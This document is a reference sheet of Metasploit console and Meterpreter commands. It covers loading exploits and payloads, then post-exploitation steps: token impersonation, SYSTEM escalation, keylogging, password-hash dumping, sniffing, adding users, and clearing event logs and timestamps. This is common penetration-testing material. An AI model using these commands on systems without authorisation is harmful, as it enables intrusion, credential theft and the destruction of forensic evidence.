# Metasploit Framework (MSF) Commands

## MSFconsole Commands

| Command | Description |
|---------|-------------|
| `show exploits` | Show all exploits within the Framework. |
| `show payloads` | Show all payloads within the Framework. |
| `show auxiliary` | Show all auxiliary modules within the Framework. |
| `search <name>` | Search for exploits or modules within the Framework. |
| `info` | Load information about a specific exploit or module. |
| `use <name>` | Load an exploit or module (example: `use windows/smb/psexec`). |
| `use <number>` | Load an exploit by using the index number displayed after the search command. |
| `set LHOST <ip>` | Your local host’s IP address reachable by the target. |
| `set RHOST <ip>` | The remote host or the target. |
| `set <option> <value>` | Set a specific value (e.g., `set LHOST 192.168.1.10`). |
| `setg <option> <value>` | Set a specific value globally. |
| `show options` | Show the options available for a module or exploit. |
| `show targets` | Show the platforms supported by the exploit. |
| `set target <number>` | Specify a specific target index. |
| `set payload <payload>` | Specify the payload to use. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
| `check` | Determine whether a target is vulnerable. |
| `exploit` | Execute the module or exploit. |
| `exploit -j` | Run the exploit in the background. |
| `exploit -z` | Do not interact with the session after exploitation. |
| `sessions -l` | List available sessions. |
| `sessions -s <script>` | Run a specific Meterpreter script on all live sessions. |
| `sessions -K` | Kill all live sessions. |
| `db_create <name>` | Create a database to use with database-driven attacks. |
| `db_nmap <nmap_options>` | Use Nmap and place results in a database. |
| `db_destroy` | Delete the current database. |

## Meterpreter Commands

| Command | Description |
|---------|-------------|
| `help` | Open Meterpreter usage help. |
| `sysinfo` | Show system information on the compromised target. |
| `ls` | List files and folders on the target. |
| `use priv` | Load the privilege extension. |
| `ps` | Show all running processes. |
| `migrate <PID>` | Migrate to a specific process. |
| `use incognito` | Load incognito functions (for token stealing). |
| `list_tokens -u` | List available tokens on the target by user. |
| `impersonate_token <DOMAIN\\USERNAME>` | Impersonate a token available on the target. |
| `getsystem` | Attempt to elevate permissions to SYSTEM-level access. |
| `shell` | Drop into an interactive shell. |
| `execute -f cmd.exe -i` | Execute cmd.exe and interact with it. |
| `upload <filename>` | Upload a file to the target. |
| `download <filename>` | Download a file from the target. |
| `keyscan_start` | Start sniffing keystrokes on the remote target. |
| `keyscan_dump` | Dump captured keystrokes. |
| `hashdump` | Dump all password hashes. |
| `sniffer_interfaces` | List available interfaces on the target. |
| `sniffer_start <interfaceID>` | Start sniffing on the remote target. |
| `add_user <username> <password> -h <ip>` | Add a user on the remote target. |
| `clearev` | Clear the event logs on the target machine. |
| `timestomp` | Change file attributes (anti-forensics measure). |
| `reboot` | Reboot the target machine. |

---
